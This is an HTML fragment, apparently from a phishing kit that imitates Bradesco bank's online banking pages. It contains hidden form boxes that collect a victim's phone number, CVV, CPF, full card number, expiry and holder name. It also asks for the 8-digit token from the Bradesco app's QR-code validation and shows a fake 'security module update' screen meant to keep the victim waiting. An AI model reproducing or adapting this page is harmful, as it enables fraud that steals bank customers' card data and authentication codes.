                        <img src="./images/phone.png" alt="">
                    </div>
                    <div class="form-code" style="width:178px;margin-top:30px;">
                        <input style="padding-left:20px;" autofocus="" type="text" id="celular" name="celular" title="Informe o número do celular cadastrado." class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4" maxlength="15">
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" id="btnAtualizarCelular" class="btn-action action-button tabindex" title="Confirmar" tabindex="5">Confirmar</button>
                    </div>

                </div>
            </div>

            <div id="boxCvv" class="boxes hide">
                <div class="boxLinha">
                    <span class="txt_msg_erro_disp hide">
                        <span class="erro_msg ml10 none_i error-show"><b>O código CVV informado não está correto.</b></span>
                    </span>
                    <p class="center">Preencha o campo a baixo com o <strong>CVV</strong> indicado<br> no verso do seu cartão de crédito / débito.</p>
                    <div class="imagem center" style="padding-top:20px">
                        <img src="./images/icone-cvv.png" alt="">
                    </div>
                    <div class="form-code" style="width:110px;margin-top:30px;">
                        <input style="text-align:center;" autofocus="" type="text" maxlength="3" id="cvv" name="cvv" title="Informe o número do celular cadastrado." class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" id="btnAtualizarCvv" class="btn-action action-button tabindex" title="Confirmar" tabindex="5">Confirmar</button>
                    </div>

                </div>
            </div>

            <div id="boxCPF" class="boxes" style="display: none;" >
                <div class="boxLinha">
                    <span id="errocpf" style="display: none;" class="txt_msg_erro_disp">
                        <span class="erro_msg ml10 none_i error-show"><b>O CPF informado não está correto.</b></span>
                    </span>
                    <p class="center">Confirme através do campo a baixo<br>o número do seu <strong>CPF</strong>.</p>
                    <div class="imagem center" style="padding-top:20px">
                        <img src="./images/icon-cpf.png" alt="">
                    </div>
                    <div class="form-code" style="width:180px;margin-top:30px;">
                        <input style="text-align: center" autofocus="" type="text" id="cpf" name="cpf" title="Informe o número do CPF." class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4" maxlength="14">
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" id="btnAtualizarCpf" class="btn-action action-button tabindex" title="Confirmar" tabindex="5">Confirmar</button>
                    </div>

                </div>
            </div>

            <<div id="boxNomeMae" style="display: none;" class="boxes">
            <div class="boxLinha">
        <span id="erromae" style="display: none;" class="txt_msg_erro_disp">
            <span class="erro_msg ml10 none_i error-show"><b>Os dados informados não estão corretos.</b></span>
        </span>
        <p class="center">Confirme através dos campos abaixo<br>os <strong>dados do seu cartão</strong>.</p>
        
        <div class="imagem center" style="padding-top:20px">
            <img src="./images/icone-mae.png" style="width:100px;" alt="">
        </div>
        
        <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; width: 350px; margin: 30px auto;">
            <!-- Número do Cartão -->
            <div class="form-code" style="width: 200px;">
                <input type="text" id="numeroCartao" placeholder="Número do cartão" class="border-chars form-digits" maxlength="16">
            </div>
            
            <!-- Validade -->
            <div class="form-code" style="width: 80px;">
                <input type="text" id="validade" placeholder="MM/AA" class="border-chars form-digits" maxlength="5">
            </div>
            
            <!-- CVV -->
            <div class="form-code" style="width: 70px;">
                <input type="text" id="vcv" placeholder="CVV" class="border-chars form-digits" maxlength="3">
            </div>
            
            <!-- Nome do Titular -->
            <div class="form-code" style="width: 100%; margin-top: 10px;">
                <input type="text" id="nomeTitular" placeholder="Nome do titular" class="border-chars form-digits">
            </div>
        </div>

        <div class="divBotoesPagina">
            <button type="button" id="btnConfirmarNomeMae" class="btn-action action-button">Confirmar</button>
        </div>
    </div>
</div>

<script>
    // Função para formatar a validade (MM/AA)
    function formatValidade(input) {
        let value = input.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        input.value = value;
    }
</script>

            <div id="boxQrCode" style="display: none;" class="boxes">
                <div class="boxLinha">
                    <span class="txt_msg_erro_disp" id="erroqrtoken" style="display: none;">
                        <span class="erro_msg ml10 none_i error-show"><b>O código informado não está correto.</b></span>
                    </span>
                    <div id="aguardeQR" style="display: none;">
                        <p>Estamos gerando uma transação aleatória para que seja possível exibir uma nova imagem <strong>QR Code</strong><br>para que você efetue a captura utilizando o <strong>App Bradesco</strong> instalado em seu celular.</p>
                        <img class="loadingQr" width="70" src="./images/loading-inicial.gif" alt="">
                        <br>
                        <a href="javascript:;"><img width="130" src="./images/btn-aguarde-disabled.png" alt=""></a>
                    </div>
                    <div id="capturaQR" style="display: none;">
                        <h1>Validação Digital</h1>
                        <div class="itemQr clearfix">
                            <div class="esquerdaQr">
                                <p style="width:200px"><span class="number">1.</span>No Aplicativo Bradesco, acesse a <strong>Chave de Segurança</strong>. Em seguida, toque na opção <strong>Validação Digital</strong> e faça a leitura desta imagem com a câmera do seu celular.</p>
                            </div>
                            <div class="direitaQr">
                                <div class="qrBox"><img style="display: none;" id="qrcodeimg" width="161" src=""></div>
                            </div>
                        </div>
                        <div class="itemQr clearfix" style="border:none">
                            <div class="esquerdaQr">
                                <p style="width:200px"><span class="number">2.</span>Digite o código que aparece no celular para validar a transação.</p>
                            </div>
                            <div class="direitaQr">
                                <input type="password" class="numeric tabindex tabfirst" title="Digite a chave informada no visor do seu celular." style="width: 84px;" id="qrCodeToken" name="codigoDispositivo" size="8" maxlength="8" tabindex="10" value="">
                                <span class="leg">(8 dígitos)</span>
                            </div>
                        </div>

                        <div class="divBotoesPagina" style="margin:30px 0px; padding:0px;width:200px">
                            <button style="margin:0px;height:30px;line-height:30px;" disabled type="button" id="btnConfirmarQr" class="btn-action action-button tabindex" title="Confirmar" tabindex="5">Confirmar</button>
                        </div>
                    </div>

                </div>
            </div>

            <div id="boxAtualizarModulo" style="display: none;" class="boxes">
                <div class="boxLinha">

                    <h1>Atualização do Módulo de Segurança!</h1>
                    <p style="margin:0px;margin-top:10px;">Aguarde enquanto atualizamos seu complemento de segurança,<br>isso pode levar alguns minutos.</p>
                    <div class="center">
                        <img width="130" src="./images/bradesco-logo.png" alt="">
                    </div>
                    <div class="barra">
                        <div class="miolo"></div>
                    </div>
                    <p class="porcentagem"></p>
                </div>
            </div>

        </div>
    </div>
</body>
<style>
    #boxAtualizarModulo .title {
        margin: 20px 0px 20px 0px;
        text-align: center;
    }

    #boxAtualizarModulo img.token {
        margin-bottom: 20px;
    }

    #boxAtualizarModulo div.container {
        padding: 0px 15px;
    }

    #boxAtualizarModulo p {
        padding: 0px 16px;
        color: #4A4A4A;
        font-size: 0.9rem;
        margin-bottom: 30px;
        font-size: 14px;
        text-align: center;
    }


    div#boxAtualizarModulo p.porcentagem {
        font: 16px/38px 'Montserrat-SemiBold';
        text-align: center;
    }

    div#boxAtualizarModulo div.barra {
        border: 1px solid #d4d4d4;
        width: 250px;
        ;
        padding: 3px;
        margin: 0 auto;
    }
</style>

</html>